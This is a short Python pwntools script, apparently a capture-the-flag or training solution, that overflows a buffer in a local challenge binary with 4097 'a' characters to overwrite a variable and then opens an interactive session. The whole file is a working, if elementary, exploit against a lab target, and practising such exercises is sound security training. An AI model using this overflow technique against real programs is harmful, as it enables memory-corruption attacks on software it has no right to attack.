"""Simple buffer overflow: overwrite variable via long input."""

from pwn import *
from pwn import process

p = process("/challenge/binary-exploitation-lose-variable")

p.sendline("a" * 4096 + "a")

p.interactive()
